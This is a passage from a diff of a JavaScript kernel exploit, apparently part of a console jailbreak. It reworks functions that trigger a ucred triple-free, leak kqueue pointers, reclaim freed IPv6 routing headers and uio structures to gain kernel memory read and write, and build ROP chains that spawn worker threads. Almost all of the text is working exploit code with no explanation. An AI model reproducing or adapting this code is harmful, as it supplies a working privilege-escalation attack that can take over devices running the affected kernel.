+                corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
+                return write(new BigInt(0,victimWpipeFd), src, n);
+            }
+
+            function kread(dest, src, n) {
+                debug('Enter kread for src: ' + src.toString());
+                corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
+                read(new BigInt(0,victimRpipeFd), dest, n);
+            }
+
+            function kwrite64(addr, val) {
+                write64(tmp, val);
+                kwrite(addr, tmp, 8);
+            }
+
+            function kwrite32(addr, val) {
+                write32(tmp, val);
+                kwrite(addr, tmp, 4);
+            }
+
+            function kread64(addr) {
+                kread(tmp, addr, 8);
+                return read64(tmp);
+            }
+
+            function kread32(addr) {
+                kread(tmp, addr, 4);
+                return read32(tmp);
+            }
+
+            function read_buffer(addr, len) {
+                var buffer = new Uint8Array(len);
+                var i;
+                for (i = 0; i < len; i++) {
+                    buffer[i] = Number(read8(addr.add(i)));
+                }
+                return buffer;
+            }
+
+            function write_buffer(addr, buffer) {
+                var i;
+                for (i = 0; i < buffer.length; i++) {
+                    write8(addr.add(i), buffer[i]);
+                }
+            }
+
+            kernel.read_buffer = function(kaddr, len) {
+                kread(tmp, kaddr, len);
+                return read_buffer(tmp, len);
+            };
+            kernel.write_buffer = function(kaddr, buf) {
+                write_buffer(tmp, buf);
+                kwrite(kaddr, tmp, buf.length);
+            };
+
+            function remove_uaf_file() {
+                if (uaf_socket === undefined) {
+                    throw new Error('uaf_socket is undefined');
+                }
+                var uafFile = fget(uaf_socket);
+                kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0,0));
+                var removed = 0;
+                var i, s;
+                for (i = 0; i < 0x1000; i++) {
+                    s = Number(socket(AF_UNIX, SOCK_STREAM, 0).lo);
+                    if (fget(s).eq(uafFile)) {
+                        kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0,0));
+                        removed++;
+                    }
+                    close(new BigInt(0,s));
+                    if (removed === 3) {
+                        break;
+                    }
+                }
+            }
+
+            function trigger_ucred_triplefree() {
+                var end = false;
+                write64(msgIov.add(0x0), 1);
+                write64(msgIov.add(0x8), 1);
+
+                var main_count = 0;
+
+                while (!end && main_count < TRIPLEFREE_ITERATIONS) {
+                    main_count++;
+
+                    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+                    write32(nc_set_buf, Number(dummy_socket.lo));
+                    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+                    close(dummy_socket);
+                    setuid(1);
+                    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0).lo);
+                    setuid(1);
+                    write32(nc_clear_buf, uaf_socket);
+                    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+
+                    var i;
+                    for (i = 0; i < 32; i++) {
+                        trigger_iov_recvmsg();
+                        sched_yield();
+                        write(new BigInt(0,iov_sock_1), tmp, 1);
+                        wait_iov_recvmsg();
+                        read(new BigInt(0,iov_sock_0), tmp, 1);
+                    }
+
+                    close(dup(new BigInt(0,uaf_socket)));
+
+                    end = find_twins();
+                    if (!end) {
+                        if (cleanup_called) {
+                            throw new Error('Netctrl failed - Reboot and try again');
+                        }
+                        close(new BigInt(0,uaf_socket));
+                        continue;
+                    }
+                    log('Triple freeing...');
+
+                    free_rthdr(ipv6_socks[twins[1]]);
+                    var count = 0;
+
+                    while (count < 10000) {
+                        trigger_iov_recvmsg();
+                        sched_yield();
+                        get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
+                        if (read32(leak_rthdr) === 1) {
+                            break;
+                        }
+                        write(new BigInt(0,iov_sock_1), tmp, 1);
+                        wait_iov_recvmsg();
+                        read(new BigInt(0,iov_sock_0), tmp, 1);
+                        count++;
+                    }
+                    if (count === 1000) {
+                        log('Dropped out from reclaim loop');
+                        close(new BigInt(0,uaf_socket));
+                        continue;
+                    }
+                    triplets[0] = twins[0];
+
+                    close(dup(new BigInt(0,uaf_socket)));
+
+                    triplets[1] = find_triplet(triplets[0], -1);
+
+                    if (triplets[1] === -1) {
+                        log("Couldn't find triplet 1");
+                        write(new BigInt(0,iov_sock_1), tmp, 1);
+                        close(new BigInt(0,uaf_socket));
+                        end = false;
+                        continue;
+                    }
+
+                    write(new BigInt(0,iov_sock_1), tmp, 1);
+
+                    triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+                    if (triplets[2] === -1) {
+                        log("Couldn't find triplet 2");
+                        close(new BigInt(0,uaf_socket));
+                        end = false;
+                        continue;
+                    }
+
+                    wait_iov_recvmsg();
+                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                }
+                if (main_count === TRIPLEFREE_ITERATIONS) {
+                    log('Failed to Triple Free');
+                    return false;
+                }
+                return true;
+            }
+
+            function leak_kqueue() {
+                debug('Leaking kqueue...');
+
+                free_rthdr(ipv6_socks[triplets[1]]);
+
+                var kq = new BigInt(0,0);
+                var magic_val = new BigInt(0x0, 0x1430000);
+                var magic_add = leak_rthdr.add(0x08);
+                var count = 0;
+                while (count < KQUEUE_ITERATIONS) {
+                    kq = kqueue();
+                    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
+                    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
+                        break;
+                    }
+                    close(kq);
+                    sched_yield();
+                    count++;
+                }
+                if (count === KQUEUE_ITERATIONS) {
+                    log('Failed to leak kqueue_fdp');
+                    return false;
+                }
+
+                kl_lock = read64(leak_rthdr.add(0x60));
+                kq_fdp = read64(leak_rthdr.add(0x98));
+                if (kq_fdp.eq(0)) {
+                    log('Failed to leak kqueue_fdp');
+                    return false;
+                }
+                debug('kq_fdp: ' + kq_fdp.toString() + ' kl_lock: ' + kl_lock.toString());
+
+                close(kq);
+
+                triplets[1] = find_triplet(triplets[0], triplets[2]);
+                return true;
+            }
+
+            function kreadslow64(address) {
+                var buffer = kreadslow(address, 8);
+                if (buffer.eq(BigInt_Error)) {
+                    cleanup();
+                    throw new Error('Netctrl failed - Reboot and try again');
+                }
+                return read64(buffer);
+            }
+
+            function build_uio(uio, uio_iov, uio_td, read, addr, size) {
+                write64(uio.add(0x00), uio_iov);
+                write64(uio.add(0x08), UIO_IOV_NUM);
+                write64(uio.add(0x10), BigInt_Error);
+                write64(uio.add(0x18), size);
+                write32(uio.add(0x20), UIO_SYSSPACE);
+                write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ);
+                write64(uio.add(0x28), uio_td);
+                write64(uio.add(0x30), addr);
+                write64(uio.add(0x38), size);
+            }
+
+            function kreadslow(addr, size) {
+                debug('Enter kreadslow addr: ' + addr.toString() + ' size : ' + size);
+
+                if (debugging.info.memory.available === 0) {
+                    log('kreadslow - Memory exhausted before start');
+                    cleanup();
+                    return BigInt_Error;
+                }
+                debug('kreadslow - Preparing buffers...');
+
+                var leak_buffers = new Array(UIO_THREAD_NUM);
+                var i, _i12, _i13, count, zeroMemoryCount, count2, zeroMemoryCount2, uio_iov, val, leak_buffer, tag_val, retry;
+                for (i = 0; i < UIO_THREAD_NUM; i++) {
+                    leak_buffers[i] = malloc(size);
+                }
+
+                write32(sockopt_val_buf, size);
+                setsockopt(new BigInt(0,uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
 
                 write(new BigInt(0,uio_sock_1), tmp, size);
-            }
-            if (count === 10000) {
-                debug('kreadslow - Failed uio reclaim after 10000 iterations');
-                return BigInt_Error;
-            }
-            debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
-            uio_iov = read64(leak_rthdr);
-            debug('kreadslow - uio_iov: ' + uio_iov.toString());
 
-            build_uio(msgIov, uio_iov, 0, true, addr, size);
-            debug('kreadslow - Freeing triplets[2]=' + triplets[2]);
+                write64(uioIovRead.add(0x08), size);
+                debug('kreadslow - Freeing triplets[1]=' + triplets[1]);
 
-            free_rthdr(ipv6_socks[triplets[2]]);
+                free_rthdr(ipv6_socks[triplets[1]]);
 
-            var iov_leak_add = leak_rthdr.add(0x20);
-            debug('kreadslow - Starting iov reclaim loop...');
-
-            zeroMemoryCount2 = 0;
-            count2 = 0;
-            while (true) {
-                count2++;
-                if (debugging.info.memory.available === 0) {
-                    zeroMemoryCount2++;
-                    if (zeroMemoryCount2 >= 5) {
-                        log('netctrl failed!');
-                        cleanup();
-                        return BigInt_Error;
+                var uio_leak_add = leak_rthdr.add(0x08);
+                debug('kreadslow - Starting uio reclaim loop...');
+                count = 0;
+                zeroMemoryCount = 0;
+                while (count < 10000) {
+                    if (debugging.info.memory.available === 0) {
+                        zeroMemoryCount++;
+                        if (zeroMemoryCount >= 5) {
+                            log('netctrl failed!');
+                            cleanup();
+                            return BigInt_Error;
+                        }
+                    } else {
+                        zeroMemoryCount = 0;
                     }
-                } else {
-                    zeroMemoryCount2 = 0;
-                }
-                trigger_iov_recvmsg();
-                sched_yield();
+                    count++;
+                    if (count % 100 === 1) {
+                        debug('kreadslow - uio loop iter ' + count);
+                    }
+                    trigger_uio_writev();
+                    sched_yield();
 
-                get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
-                if (read32(iov_leak_add) === UIO_SYSSPACE) {
-                    debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations');
-                    break;
+                    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+                    if (read32(uio_leak_add) === UIO_IOV_NUM) {
+                        break;
+                    }
+
+                    read(new BigInt(0,uio_sock_0), tmp, size);
+                    for (_i12 = 0; _i12 < UIO_THREAD_NUM; _i12++) {
+                        read(new BigInt(0,uio_sock_0), leak_buffers[_i12], size);
+                    }
+                    wait_uio_writev();
+
+                    write(new BigInt(0,uio_sock_1), tmp, size);
                 }
+                if (count === 10000) {
+                    debug('kreadslow - Failed uio reclaim after 10000 iterations');
+                    return BigInt_Error;
+                }
+                debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
+                uio_iov = read64(leak_rthdr);
+                debug('kreadslow - uio_iov: ' + uio_iov.toString());
+
+                build_uio(msgIov, uio_iov, 0, true, addr, size);
+                debug('kreadslow - Freeing triplets[2]=' + triplets[2]);
+
+                free_rthdr(ipv6_socks[triplets[2]]);
+
+                var iov_leak_add = leak_rthdr.add(0x20);
+                debug('kreadslow - Starting iov reclaim loop...');
+
+                zeroMemoryCount2 = 0;
+                count2 = 0;
+                while (true) {
+                    count2++;
+                    if (debugging.info.memory.available === 0) {
+                        zeroMemoryCount2++;
+                        if (zeroMemoryCount2 >= 5) {
+                            log('netctrl failed!');
+                            cleanup();
+                            return BigInt_Error;
+                        }
+                    } else {
+                        zeroMemoryCount2 = 0;
+                    }
+                    trigger_iov_recvmsg();
+                    sched_yield();
+
+                    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+                    if (read32(iov_leak_add) === UIO_SYSSPACE) {
+                        debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations');
+                        break;
+                    }
+
+                    write(new BigInt(0,iov_sock_1), tmp, 1);
+                    wait_iov_recvmsg();
+                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                }
+                debug('kreadslow - Reading leak buffers...');
+
+                read(new BigInt(0,uio_sock_0), tmp, size);
+                leak_buffer = new BigInt(0,0);
+                tag_val = new BigInt(0x41414141, 0x41414141);
+
+                for (_i13 = 0; _i13 < UIO_THREAD_NUM; _i13++) {
+                    read(new BigInt(0,uio_sock_0), leak_buffers[_i13], size);
+                    val = read64(leak_buffers[_i13]);
+                    debug('kreadslow - leak_buffers[' + _i13 + ']: ' + val.toString());
+                    if (!val.eq(tag_val)) {
+                        debug('kreadslow - Found valid leak at index ' + _i13 + ', finding triplets[1]...');
+                        triplets[1] = find_triplet(triplets[0], -1);
+                        debug('kreadslow - triplets[1]=' + triplets[1]);
+                        leak_buffer = leak_buffers[_i13].add(0);
+                    }
+                }
+
+                wait_uio_writev();
 
                 write(new BigInt(0,iov_sock_1), tmp, 1);
-                wait_iov_recvmsg();
-                read(new BigInt(0,iov_sock_0), tmp, 1);
-            }
-            debug('kreadslow - Reading leak buffers...');
-
-            read(new BigInt(0,uio_sock_0), tmp, size);
-            leak_buffer = new BigInt(0,0);
-            tag_val = new BigInt(0x41414141, 0x41414141);
-
-            for (_i13 = 0; _i13 < UIO_THREAD_NUM; _i13++) {
-                read(new BigInt(0,uio_sock_0), leak_buffers[_i13], size);
-                val = read64(leak_buffers[_i13]);
-                debug('kreadslow - leak_buffers[' + _i13 + ']: ' + val.toString());
-                if (!val.eq(tag_val)) {
-                    debug('kreadslow - Found valid leak at index ' + _i13 + ', finding triplets[1]...');
-                    triplets[1] = find_triplet(triplets[0], -1);
-                    debug('kreadslow - triplets[1]=' + triplets[1]);
-                    leak_buffer = leak_buffers[_i13].add(0);
+                if (leak_buffer.eq(0)) {
+                    debug('kreadslow - No valid leak found');
+                    wait_iov_recvmsg();
+                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                    return BigInt_Error;
                 }
-            }
+                debug('kreadslow - Finding triplets[2]...');
 
-            wait_uio_writev();
+                for (retry = 0; retry < 3; retry++) {
+                    triplets[2] = find_triplet(triplets[0], triplets[1]);
+                    if (triplets[2] !== -1) break;
+                    debug('kreadslow - triplets[2] retry ' + (retry + 1));
+                    sched_yield();
+                }
+                debug('kreadslow - triplets[2]=' + triplets[2]);
+                if (triplets[2] === -1) {
+                    debug('kreadslow - Failed to find triplets[2]');
+                    wait_iov_recvmsg();
+                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                    return BigInt_Error;
+                }
 
-            write(new BigInt(0,iov_sock_1), tmp, 1);
-            if (leak_buffer.eq(0)) {
-                debug('kreadslow - No valid leak found');
                 wait_iov_recvmsg();
                 read(new BigInt(0,iov_sock_0), tmp, 1);
-                return BigInt_Error;
-            }
-            debug('kreadslow - Finding triplets[2]...');
-
-            for (retry = 0; retry < 3; retry++) {
-                triplets[2] = find_triplet(triplets[0], triplets[1]);
-                if (triplets[2] !== -1) break;
-                debug('kreadslow - triplets[2] retry ' + (retry + 1));
-                sched_yield();
-            }
-            debug('kreadslow - triplets[2]=' + triplets[2]);
-            if (triplets[2] === -1) {
-                debug('kreadslow - Failed to find triplets[2]');
-                wait_iov_recvmsg();
-                read(new BigInt(0,iov_sock_0), tmp, 1);
-                return BigInt_Error;
+                debug('kreadslow - Done, returning leak_buffer: ' + leak_buffer.toString());
+                return leak_buffer;
             }
 
-            wait_iov_recvmsg();
-            read(new BigInt(0,iov_sock_0), tmp, 1);
-            debug('kreadslow - Done, returning leak_buffer: ' + leak_buffer.toString());
-            return leak_buffer;
-        }
+            function kwriteslow(addr, buffer, size) {
+                debug('Enter kwriteslow addr: ' + addr.toString() + ' buffer: ' + buffer.toString() + ' size : ' + size);
 
-        function kwriteslow(addr, buffer, size) {
-            debug('Enter kwriteslow addr: ' + addr.toString() + ' buffer: ' + buffer.toString() + ' size : ' + size);
+                write32(sockopt_val_buf, size);
+                setsockopt(new BigInt(0,uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
 
-            write32(sockopt_val_buf, size);
-            setsockopt(new BigInt(0,uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+                write64(uioIovWrite.add(0x08), size);
 
-            write64(uioIovWrite.add(0x08), size);
+                free_rthdr(ipv6_socks[triplets[1]]);
 
-            free_rthdr(ipv6_socks[triplets[1]]);
+                var uio_leak_add = leak_rthdr.add(0x08);
 
-            var uio_leak_add = leak_rthdr.add(0x08);
-
-            var zeroMemoryCount = 0;
-            while (true) {
-                if (debugging.info.memory.available === 0) {
-                    zeroMemoryCount++;
-                    if (zeroMemoryCount >= 5) {
-                        log('netctrl failed!');
-                        cleanup();
-                        return BigInt_Error;
+                var zeroMemoryCount = 0;
+                while (true) {
+                    if (debugging.info.memory.available === 0) {
+                        zeroMemoryCount++;
+                        if (zeroMemoryCount >= 5) {
+                            log('netctrl failed!');
+                            cleanup();
+                            return BigInt_Error;
+                        }
+                    } else {
+                        zeroMemoryCount = 0;
                     }
-                } else {
-                    zeroMemoryCount = 0;
-                }
-                trigger_uio_readv();
-                sched_yield();
+                    trigger_uio_readv();
+                    sched_yield();
 
-                get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
-                if (read32(uio_leak_add) === UIO_IOV_NUM) {
-                    break;
+                    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+                    if (read32(uio_leak_add) === UIO_IOV_NUM) {
+                        break;
+                    }
+
+                    var i;
+                    for (i = 0; i < UIO_THREAD_NUM; i++) {
+                        write(new BigInt(0,uio_sock_1), buffer, size);
+                    }
+                    wait_uio_readv();
+                }
+                var uio_iov = read64(leak_rthdr);
+
+                build_uio(msgIov, uio_iov, 0, false, addr, size);
+
+                free_rthdr(ipv6_socks[triplets[2]]);
+
+                var iov_leak_add = leak_rthdr.add(0x20);
+
+                var zeroMemoryCount2 = 0;
+                while (true) {
+                    if (debugging.info.memory.available === 0) {
+                        zeroMemoryCount2++;
+                        if (zeroMemoryCount2 >= 5) {
+                            log('netctrl failed!');
+                            cleanup();
+                            return BigInt_Error;
+                        }
+                    } else {
+                        zeroMemoryCount2 = 0;
+                    }
+                    trigger_iov_recvmsg();
+                    sched_yield();
+
+                    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+                    if (read32(iov_leak_add) === UIO_SYSSPACE) {
+                        break;
+                    }
+
+                    write(new BigInt(0,iov_sock_1), tmp, 1);
+                    wait_iov_recvmsg();
+                    read(new BigInt(0,iov_sock_0), tmp, 1);
                 }
 
-                var i;
                 for (i = 0; i < UIO_THREAD_NUM; i++) {
                     write(new BigInt(0,uio_sock_1), buffer, size);
                 }
+
+                triplets[1] = find_triplet(triplets[0], -1);
+
                 wait_uio_readv();
-            }
-            var uio_iov = read64(leak_rthdr);
-
-            build_uio(msgIov, uio_iov, 0, false, addr, size);
-
-            free_rthdr(ipv6_socks[triplets[2]]);
-
-            var iov_leak_add = leak_rthdr.add(0x20);
-
-            var zeroMemoryCount2 = 0;
-            while (true) {
-                if (debugging.info.memory.available === 0) {
-                    zeroMemoryCount2++;
-                    if (zeroMemoryCount2 >= 5) {
-                        log('netctrl failed!');
-                        cleanup();
-                        return BigInt_Error;
-                    }
-                } else {
-                    zeroMemoryCount2 = 0;
-                }
-                trigger_iov_recvmsg();
-                sched_yield();
-
-                get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
-                if (read32(iov_leak_add) === UIO_SYSSPACE) {
-                    break;
-                }
 
                 write(new BigInt(0,iov_sock_1), tmp, 1);
+
+                var retry;
+                for (retry = 0; retry < 3; retry++) {
+                    triplets[2] = find_triplet(triplets[0], triplets[1]);
+                    if (triplets[2] !== -1) break;
+                    sched_yield();
+                }
+                if (triplets[2] === -1) {
+                    debug('kwriteslow - Failed to find triplets[2]');
+                    wait_iov_recvmsg();
+                    read(new BigInt(0,iov_sock_0), tmp, 1);
+                    return BigInt_Error;
+                }
+
                 wait_iov_recvmsg();
                 read(new BigInt(0,iov_sock_0), tmp, 1);
+                return new BigInt(0,0);
             }
 
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                write(new BigInt(0,uio_sock_1), buffer, size);
+            function rop_regen_and_loop(last_rop_entry, number_entries) {
+                var new_rop_entry = last_rop_entry.add(8);
+                var copy_entry = last_rop_entry.sub(number_entries * 8).add(8);
+                var rop_loop = last_rop_entry.sub(number_entries * 8).add(8);
+
+                var i;
+                for (i = 0; i < number_entries; i++) {
+                    var entry_add = copy_entry;
+                    var entry_val = read64(copy_entry);
+                    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
+                    write64(new_rop_entry.add(0x8), entry_add);
+                    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
+                    write64(new_rop_entry.add(0x18), entry_val);
+                    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                    copy_entry = copy_entry.add(8);
+                    new_rop_entry = new_rop_entry.add(0x28);
+                }
+
+                write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
+                write64(new_rop_entry.add(0x8), rop_loop);
             }
 
-            triplets[1] = find_triplet(triplets[0], -1);
+            function spawn_thread(rop_array, loop_entries, predefinedStack) {
+                var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);
+                var i;
+                for (i = 0; i < rop_array.length; i++) {
+                    write64(rop_addr.add(i * 8), rop_array[i]);
+                }
 
-            wait_uio_readv();
+                if (loop_entries !== 0) {
+                    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8);
+                    rop_regen_and_loop(last_rop_entry, loop_entries);
+                }
+                var jmpbuf = malloc(0x60);
 
-            write(new BigInt(0,iov_sock_1), tmp, 1);
+                write64(jmpbuf.add(0x00), gadgets.RET);
+                write64(jmpbuf.add(0x10), rop_addr);
+                write32(jmpbuf.add(0x40), saved_fpu_ctrl);
+                write32(jmpbuf.add(0x44), saved_mxcsr);
 
-            var retry;
-            for (retry = 0; retry < 3; retry++) {
-                triplets[2] = find_triplet(triplets[0], triplets[1]);
-                if (triplets[2] !== -1) break;
-                sched_yield();
-            }
-            if (triplets[2] === -1) {
-                debug('kwriteslow - Failed to find triplets[2]');
-                wait_iov_recvmsg();
-                read(new BigInt(0,iov_sock_0), tmp, 1);
-                return BigInt_Error;
-            }
+                var stack_size = new BigInt(0,0x100);
+                var tls_size = new BigInt(0,0x40);
+                var stack = malloc(Number(stack_size.lo));
+                var tls = malloc(Number(tls_size.lo));
+                write64(spawn_thr_args.add(0x00), longjmp_addr);
+                write64(spawn_thr_args.add(0x08), jmpbuf);
+                write64(spawn_thr_args.add(0x10), stack);
+                write64(spawn_thr_args.add(0x18), stack_size);
+                write64(spawn_thr_args.add(0x20), tls);
+                write64(spawn_thr_args.add(0x28), tls_size);
+                write64(spawn_thr_args.add(0x30), spawn_tid);
+                write64(spawn_thr_args.add(0x38), spawn_cpid);
 
-            wait_iov_recvmsg();
-            read(new BigInt(0,iov_sock_0), tmp, 1);
-            return new BigInt(0,0);
-        }
-
-        function rop_regen_and_loop(last_rop_entry, number_entries) {
-            var new_rop_entry = last_rop_entry.add(8);
-            var copy_entry = last_rop_entry.sub(number_entries * 8).add(8);
-            var rop_loop = last_rop_entry.sub(number_entries * 8).add(8);
-
-            var i;
-            for (i = 0; i < number_entries; i++) {
-                var entry_add = copy_entry;
-                var entry_val = read64(copy_entry);
-                write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
-                write64(new_rop_entry.add(0x8), entry_add);
-                write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
-                write64(new_rop_entry.add(0x18), entry_val);
-                write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-                copy_entry = copy_entry.add(8);
-                new_rop_entry = new_rop_entry.add(0x28);
+                var result = thr_new(spawn_thr_args, 0x68);
+                if (!result.eq(0)) {
+                    throw new Error('thr_new failed: ' + result.toString());
+                }
+                return read64(spawn_tid);
             }
 
-            write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
-            write64(new_rop_entry.add(0x8), rop_loop);
-        }
+            function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
+                var rop = [];
+                rop.push(new BigInt(0,0));
 
-        function spawn_thread(rop_array, loop_entries, predefinedStack) {
-            var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);
-            var i;
-            for (i = 0; i < rop_array.length; i++) {
-                write64(rop_addr.add(i * 8), rop_array[i]);
-            }
+                var cpu_mask = malloc(0x10);
+                write16(cpu_mask, 1 << MAIN_CORE);
 
-            if (loop_entries !== 0) {
-                var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8);
-                rop_regen_and_loop(last_rop_entry, loop_entries);
-            }
-            var jmpbuf = malloc(0x60);
-
-            write64(jmpbuf.add(0x00), gadgets.RET);
-            write64(jmpbuf.add(0x10), rop_addr);
-            write32(jmpbuf.add(0x40), saved_fpu_ctrl);
-            write32(jmpbuf.add(0x44), saved_mxcsr);
-
-            var stack_size = new BigInt(0,0x100);
-            var tls_size = new BigInt(0,0x40);
-            var stack = malloc(Number(stack_size.lo));
-            var tls = malloc(Number(tls_size.lo));
-            write64(spawn_thr_args.add(0x00), longjmp_addr);
-            write64(spawn_thr_args.add(0x08), jmpbuf);
-            write64(spawn_thr_args.add(0x10), stack);
-            write64(spawn_thr_args.add(0x18), stack_size);
-            write64(spawn_thr_args.add(0x20), tls);
-            write64(spawn_thr_args.add(0x28), tls_size);
-            write64(spawn_thr_args.add(0x30), spawn_tid);
-            write64(spawn_thr_args.add(0x38), spawn_cpid);
-
-            var result = thr_new(spawn_thr_args, 0x68);
-            if (!result.eq(0)) {
-                throw new Error('thr_new failed: ' + result.toString());
-            }
-            return read64(spawn_tid);
-        }
-
-        function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
-            var rop = [];
-            rop.push(new BigInt(0,0));
-
-            var cpu_mask = malloc(0x10);
-            write16(cpu_mask, 1 << MAIN_CORE);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,3));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(BigInt_Error);
-            rop.push(gadgets.POP_RCX_RET);
-            rop.push(new BigInt(0,0x10));
-            rop.push(gadgets.POP_R8_RET);
-            rop.push(cpu_mask);
-            rop.push(cpuset_setaffinity_wrapper);
-            var rtprio_buf = malloc(4);
-            write16(rtprio_buf, PRI_REALTIME);
-            write16(rtprio_buf.add(2), MAIN_RTPRIO);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,0));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(rtprio_buf);
-            rop.push(rtprio_thread_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(ready_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_init = rop.length;
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(run_fd);
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(signal_buf);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(read_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,iov_sock_0));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(msg);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,0));
-            rop.push(recvmsg_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(done_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_end = rop.length;
-            var loop_size = loop_end - loop_init;
-
-            return { rop: rop, loop_size: loop_size };
-        }
-
-        function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
-            var rop = [];
-            rop.push(new BigInt(0,0));
-
-            var cpu_mask = malloc(0x10);
-            write16(cpu_mask, 1 << MAIN_CORE);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,3));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(BigInt_Error);
-            rop.push(gadgets.POP_RCX_RET);
-            rop.push(new BigInt(0,0x10));
-            rop.push(gadgets.POP_R8_RET);
-            rop.push(cpu_mask);
-            rop.push(cpuset_setaffinity_wrapper);
-            var rtprio_buf = malloc(4);
-            write16(rtprio_buf, PRI_REALTIME);
-            write16(rtprio_buf.add(2), MAIN_RTPRIO);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,0));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(rtprio_buf);
-            rop.push(rtprio_thread_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(ready_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_init = rop.length;
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(run_fd);
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(signal_buf);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(read_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,uio_sock_0));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(uioIovWrite);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,UIO_IOV_NUM));
-            rop.push(readv_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(done_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_end = rop.length;
-            var loop_size = loop_end - loop_init;
-
-            return { rop: rop, loop_size: loop_size };
-        }
-
-        function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
-            var rop = [];
-            rop.push(new BigInt(0,0));
-
-            var cpu_mask = malloc(0x10);
-            write16(cpu_mask, 1 << MAIN_CORE);
-
-            rop.push(gadgets.POP_RDI_RET);
